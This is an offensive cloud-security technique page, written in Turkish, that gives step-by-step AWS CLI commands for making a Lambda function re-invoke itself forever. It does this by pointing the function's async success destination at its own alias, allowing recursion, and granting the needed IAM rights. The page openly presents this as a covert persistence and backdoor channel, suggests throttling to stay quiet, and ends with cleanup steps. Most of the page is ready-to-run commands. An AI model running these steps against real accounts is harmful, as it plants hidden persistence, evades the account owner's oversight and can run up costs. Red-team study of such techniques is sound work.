# AWS - Lambda Asenkron Kendi Kendine Döngü Kalıcılığı üzerinden Destinations + Recursion Allow

Lambda'nin asenkron destinations özelliğini Recursion yapılandırmasıyla kötüye kullanarak bir fonksiyonun harici bir zamanlayıcı (EventBridge, cron vb. olmadan) kendini sürekli yeniden invoke etmesini sağlayın. Varsayılan olarak Lambda, özyinelemeli döngüleri sonlandırır; ancak recursion konfigürasyonunu Allow olarak ayarlamak bunları yeniden etkinleştirir. Destinations, async invokes için servis tarafında teslimat yapar; bu nedenle tek bir başlangıç invoke'u kod gerektirmeyen, gizli bir heartbeat/backdoor kanalı oluşturur. Gürültüyü düşük tutmak için isteğe bağlı olarak reserved concurrency ile throttle edebilirsiniz.

Notlar
- Lambda doğrudan fonksiyonu kendi destination'ı olacak şekilde yapılandırmaya izin vermez. Destination olarak bir function alias kullanın ve execution role'un bu alias'ı invoke etmesine izin verin.
- Minimum izinler: hedef fonksiyonun event invoke config ve recursion config'ini okuma/güncelleme yetkisi, bir version publish etme ve alias yönetme, ve function’un execution role policy'sini alias üzerinde lambda:InvokeFunction iznini vermek için güncelleme yetkisi.

## Gereksinimler
- Region: us-east-1
- Vars:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## Adımlar

1) Fonksiyon ARN'sini ve mevcut Recursion ayarını alın
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) Bir sürüm yayınlayın ve bir alias oluşturun/güncelleyin (kendi hedefi olarak kullanılır)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) Fonksiyonun yürütme rolünün alias'ı çağırmasına izin verin (Lambda Destinations→Lambda tarafından gereklidir)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) async destination'ı alias'a (self via alias) yapılandırın ve retries'i devre dışı bırakın
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) Özyinelemeli döngülere izin verin
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) Tek bir asenkron invoke tetikleyin
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) Sürekli çağrıları gözlemleyin (örnekler)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) Opsiyonel gizli sınırlama
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## Temizlik
Döngüyü sonlandırın ve persistence'i kaldırın.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## Impact
- Tek bir async invoke, Lambda'nın harici bir zamanlayıcı olmadan kendini sürekli yeniden çağırmasına neden olur; bu da gizli persistence/heartbeat'e olanak tanır. Reserved concurrency, gürültüyü tek bir warm execution ile sınırlayabilir.
